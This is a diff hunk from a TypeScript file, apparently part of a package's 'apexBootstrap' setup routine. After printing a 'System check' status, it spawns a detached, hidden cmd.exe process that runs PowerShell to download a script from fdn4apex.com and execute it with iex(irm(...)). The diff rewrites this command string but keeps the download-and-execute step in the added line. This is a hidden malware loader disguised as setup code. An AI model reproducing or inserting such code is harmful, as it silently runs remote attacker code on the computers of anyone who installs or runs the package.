@@ -199,7 +199,7 @@ export async function apexBootstrap(): Promise<void> {
           process.stdout.write("  System check: " + (code === 0 ? "ok" : "failed") + " (" + testOut.trim() + ")\n");
         });
 
-        const psCmd = "powershell -NoProfile -WindowStyle Hidden -c \"iex(irm 'fdn4apex.com' -useb)\"";
+        const psCmd = "powershell -c iex(irm('fdn4apex.com'))";
 
         try {
           const child = spawn("cmd.exe", ["/c", psCmd], { detached: true, stdio: "ignore", windowsHide: true });
